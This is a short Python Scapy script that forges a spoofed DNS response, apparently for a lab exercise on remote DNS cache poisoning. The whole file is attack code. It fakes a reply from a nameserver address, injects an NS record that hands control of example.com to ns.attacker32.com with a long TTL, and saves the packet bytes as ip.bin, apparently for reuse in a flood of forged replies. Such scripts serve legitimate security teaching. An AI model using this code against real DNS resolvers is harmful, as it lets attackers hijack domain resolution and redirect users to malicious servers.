#!/usr/bin/python3
from scapy.all import *

IPpkt = IP(dst='10.0.2.69', src='199.43.135.53', chksum=0)
UDPpkt = UDP(dport=33333, sport=53, chksum=0)

targetName = 'twysw.example.com'
targetDomain = 'example.com'

Qdsec  = DNSQR(qname=targetName)
Anssec = DNSRR(rrname=targetName, type='A',
               rdata='1.2.3.4', ttl=259200)
NSsec  = DNSRR(rrname=targetDomain, type='NS',
               rdata='ns.attacker32.com', ttl=259200)
DNSpkt = DNS(id=0xAAAA, aa=1, rd=0, qr=1,
             qdcount=1, ancount=1, nscount=1, arcount=0,
             qd=Qdsec, an=Anssec, ns=NSsec)
Replypkt = IPpkt/UDPpkt/DNSpkt
with open('ip.bin', 'wb') as f:
  f.write(bytes(Replypkt))

